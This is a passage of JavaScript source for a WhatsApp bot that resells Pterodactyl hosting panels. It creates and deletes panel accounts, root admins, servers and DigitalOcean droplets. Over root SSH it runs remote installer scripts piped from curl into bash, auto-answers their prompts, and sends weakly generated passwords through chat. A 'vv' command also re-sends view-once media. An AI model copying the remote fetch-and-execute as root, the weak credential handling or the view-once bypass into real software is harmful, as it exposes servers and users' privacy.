"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Panel server not found!")
m.reply(`Successfully deleted the panel server *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@samhax.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Samhax",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/ptero-eggs/yolks:nodejs_22",
"startup": startup_cmd,
"environment": {
"INST": "npm",
      "USER_UPLOAD": "0",
      "AUTO_UPDATE": "0",
      "MAIN_FILE": "index.js", // <-- FIX 2: Samhax Egg requires this
      "CMD_RUN": "npm start" // Keep this line for compatibility or remove if not needed
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created the panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*🟢 Your Bot Panel Account Initiated...*

┏━━❑ *💻 Samhax Store Panel Login Details* ━━❑
┃ 👤 Username : ${user.username}
┃ 🔐 Password : ${password}
┃
├─❏ *POWERED BY LORD SAMHAX* ━━❑
┃
├─❏ *🌍 SEVER SPECIFICATIONS* ━━❑
┃ 📡 Server ID *(${server.id})*
┃ 💾 RAM : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
┃ 💽 DISK : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
┃ 🗄️ CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
┃ 🌍 Panel Domain : ${global.domain}
┃
├─❏ *POWERED BY LORD SAMHAX* ━━❑
┃
├─❏ 🔰 *Our Store Terms & Conditions :* ━━❑
┃📝 Panel expires after 1 month
┃📝 Save this data as best as possible, changing of password is also commended
┃📝 15 days purchase guarantee (1x replacement)
┃📝 Warranty claims require proof of purchase chat.
┃ 
┗━━❑ *POWERED BY LORD SAMHAX* ━━❑
`
await fs.writeFileSync("Samhax Store.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./Samhax Store.txt"), fileName: "Samhax Store.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./Samhax Store.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
var teks = " *乂 List admin Samhax Store*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Name : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Delete Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Bot Servers")
let messageText = "\n  *乂 List Samhax Store server panel*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Name : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Delete Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nSelect One Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Admin panel account not found!")
await m.reply(`Successfully deleted admin panel account *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Bot Servers")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Select One Panel Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Panel server not found!")
m.reply(`Successfully deleted the panel server *${capital(nameSrv)}*`)
}
break
case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@samhax.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created admin panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Admin Panel Account Data 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Samhax Store Terms & Conditions :*
* Admin account will be Expired in  1 month
* Save this data as best as possible
* Don't just delete the server!
* Caught stealing sc, auto delete account no reff!
`
await fs.writeFileSync("./Samhax Store.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./Samhax Store.txt"), fileName: "Samhax Store.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./Samhax Store.txt")
}
break
case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@samhax.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created admin panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Admin Panel Account Data 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domainV2}

*Samhax store Terms & Conditions :*
* Admin account will be Expired in  1 month
* Save this data as best as possible
* Don't just delete the server!
* Caught stealing sc, auto delete account no reff!
`
await fs.writeFileSync("./Samhax Store.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./Samhax Store.txt"), fileName: "Samhax Store.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./Samhax Store.txt")
}
break
case 'idch': case 'cekidch': {

if (!text) return Reply("where is the link?")
if (!text.includes("https://whatsapp.com/channel/")) return Reply("Link is invalid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "powered by Samhax | Store Cpanel " }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await conn.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
case "brat": {
if (!text) return m.reply(example('the text'))
let brat = `https://api.nekorinn.my.id/maker/brat-v2?text=${encodeURIComponent(text)}&isVideo=false`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break
case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('the text'))
try {
let brat = `https://api.nekorinn.my.id/maker/brat-v2?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break
case "vv": case "readviewonce": {
if (!m.quoted) return m.reply(example("by replying to the message"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("The message is not viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case 'resetowner': {
    if (!isCreator) return Reply(mess.owner);

    // Pastikan database ada sebelum mencoba menghapus
    if (!Array.isArray(owners) || owners.length === 0) {
        return Reply("Yare yare. Don't waste time checking. There are no masters left to acknowledge. 🥶!");
    }

    // Buat salinan baru dari daftar owner, hanya menyisakan owner utama
    let updatedOwners = owners.filter(owner => owner === global.owner);

    // Simpan perubahan ke file database
    try {
        await fs.writeFileSync("./library/database/owner.json", JSON.stringify(updatedOwners, null, 2));
        
        // Perbarui daftar owner di dalam program
        owners.length = 0; // Kosongkan array asli
        owners.push(...updatedOwners); // Tambahkan kembali owner utama
        
        Reply("Owner excess eliminated. Sole authority retained.✅");
    } catch (err) {
        console.error("Error while saving database:", err);
        Reply("An error occurred while deleting the owner. ❌");
    }
}

break
case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("My lord, the number is required. Deliver it.📝"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Number ${input2} already a reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`DONE ADDING RESELLERS`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
if (premium.length < 1) return m.reply("No reseller users")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("My lord, the number is required. Deliver it.📝"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Cannot delete owner!`)
if (!premium.includes(input)) return m.reply(`Number ${input2} not a reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`DONE DELETE RESELLER`)
}
break
case 'rch': {
    if (!args[0] || !isCreator) {
        return m.reply(`Example use:\n.reactch https://whatsapp.com/channel/xxxx where is Lord`);
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return m.reply("Link is invalid.");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ').toLowerCase();
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await conn.newsletterMetadata("invite", channelId);
        await conn.newsletterReactMessage(res.id, messageId, emoji);

        return m.reply(`Successfully sent reaction *${emoji}* messages on the channel *${res.name}*.`);
    } catch (e) {
        console.error(e);
        return m.reply("Oops! That reaction didn't stick. Check your link and emoji, then try again.👍.");
    }
};
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'startwings': case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Successfully executed wings by Lord Samhax✅*\n* Status wings : *active*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Invalid password or IP');
}).connect(connSettings);
}

break
case 'uninstalltema': {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Processing *uninstall* tema pterodactyl\nWait 1-10 minutes for the process to complete")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Successfully *uninstalled* the pterodactyl theme ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Invalid password or IP');
}).connect(connSettings);
}
break
case 'uninstallpanel': {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Processing *uninstall* server panel\nWait 1-10 minutes for the process to complete")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Successfully *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Successfully Uninstall Server Panell ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Invalid password or IP')
}).connect(connSettings)
}
break
case 'r1c1': case 'r2c1': case 'r2c2': case 'r4c2': case 'r8c4': case 'r16c4': {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Processing VPS creation...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "No IP address available";

            let messageText = `VPS successfully created!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Failed to create VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`An error occurred while creating the VPS: ${err}`);
    }
}
break;

case 'resetpwvps': {
    if (!isCreator) return Reply(mess.owner);

    // Memisahkan input teks
    let t = text.split('|');
    if (t.length < 3) return Reply(`⚠️ *Incorrect format!*\nUsage: ${command} ipvps|password|passwordbaru`);

    let ipvps = t[0];
    let passwd = t[1];
    let pw = t[2];

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const connCommand = `${global.bash}`;
    const conn = new Client();

    // Fungsi untuk mendapatkan waktu WIB
    const getWIBTime = () => {
        const date = new Date();
        const options = { timeZone: 'Asia/Karachi', hour12: false };
        return date.toLocaleString('id-ID', options);
    };

    const startTime = getWIBTime(); // Catat waktu mulai

    Reply(`🔐 *Changing VPS Password Begins...*\n⏰ Start Time: ${startTime}`);

    conn.on('ready', () => {
        conn.exec(connCommand, (err, stream) => {
            if (err) throw err;

            stream.on('close', (code, signal) => {
                const endTime = getWIBTime(); // Catat waktu selesai
                console.log(`Stream closed with code ${code} and signal ${signal}`);
                Reply(`✅ *VPS Password Successfully Changed!*\n\n📋 *VPS Details:*\n- 🌐 VPS IP: ${ipvps}\n- 🔑 New Password: ${pw}\n\n⏰ *Processing Time:*\n- Start: ${startTime}\n- Finished: ${endTime}\n\n💡 *Note:* Please save this data safely. Thank you.! ✨`);
                conn.end();
            }).on('data', (data) => {
                // Mengirimkan perintah melalui stream
                stream.write(`${global.tokeninstall}\n`);
                stream.write('8\n');
                stream.write(`${pw}\n`);
                stream.write(`${pw}\n`);
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
